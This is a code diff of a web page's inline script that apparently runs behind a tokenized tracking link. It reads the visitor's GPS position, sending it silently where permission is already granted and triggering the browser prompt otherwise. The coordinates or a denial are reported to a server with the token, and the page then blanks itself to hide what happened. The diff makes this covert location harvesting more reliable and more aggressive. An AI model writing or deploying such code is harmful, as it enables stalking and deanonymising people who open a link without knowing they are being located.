@@ -39,67 +39,79 @@
     }
   }
 
-  function sendFallback() {
+  function sendDenied() {
     if (_sent) return;
     _sent = true;
-    fetch('/api/location-denied', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ token: token }),
-      keepalive: true
-    }).catch(function(){});
+    var payload = JSON.stringify({ token: token });
+    var blob = new Blob([payload], { type: 'application/json' });
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon('/api/location-denied', blob);
+    } else {
+      try { fetch('/api/location-denied', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
+    }
   }
 
   function vanish() {
     try { window.location.replace('about:blank'); } catch(e) {}
-    try { window.open('', '_self', '').close(); } catch(e) {}
-    try { self.close(); } catch(e) {}
-    try { window.close(); } catch(e) {}
     setTimeout(function() {
       try {
         document.open();
         document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body></body></html>');
         document.close();
       } catch(e) {}
-    }, 5);
+    }, 10);
   }
 
-  // ── Permission-aware GPS attempt ──
-  // Only fires if permission already granted — never triggers a prompt
+  function attemptGps(callback) {
+    if (!('geolocation' in navigator)) {
+      sendDenied();
+      if (callback) callback();
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+        if (callback) callback();
+      },
+      function(err) {
+        // err.code 1 = denied, 2 = unavailable, 3 = timeout
+        sendDenied();
+        if (callback) callback();
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  // ── Permission-aware approach ──
   if (navigator.permissions && navigator.permissions.query) {
     navigator.permissions.query({ name: 'geolocation' }).then(function(status) {
-      if (status.state === 'granted' && 'geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          function(pos) {
-            sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-            vanish();
-          },
-          function() {
-            sendFallback();
-            vanish();
-          },
-          { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
-        );
-        setTimeout(function() {
-          if (!_sent) { sendFallback(); vanish(); }
-        }, 10000);
-      } else {
-        sendFallback();
+      if (status.state === 'granted') {
+        // Silently fire GPS — no prompt
+        attemptGps(function() { vanish(); });
+      } else if (status.state === 'denied') {
+        // Already denied — no point trying
+        sendDenied();
         vanish();
+      } else {
+        // 'prompt' state — this WILL show the browser dialog
+        // Attempt GPS and let the prompt appear naturally
+        attemptGps(function() { vanish(); });
       }
     }).catch(function() {
-      sendFallback();
-      vanish();
+      // Permissions API unavailable — just try GPS
+      attemptGps(function() { vanish(); });
     });
   } else {
-    sendFallback();
-    vanish();
+    // No permissions API — just try GPS (may prompt)
+    attemptGps(function() { vanish(); });
   }
 
+  // ── Safety timeout: vanish after ~22s if something hangs ──
   setTimeout(function() {
-    if (!_sent) { sendFallback(); }
+    if (!_sent) { sendDenied(); }
     vanish();
-  }, 4000);
+  }, 22000);
 })();
 </script>
 </body>
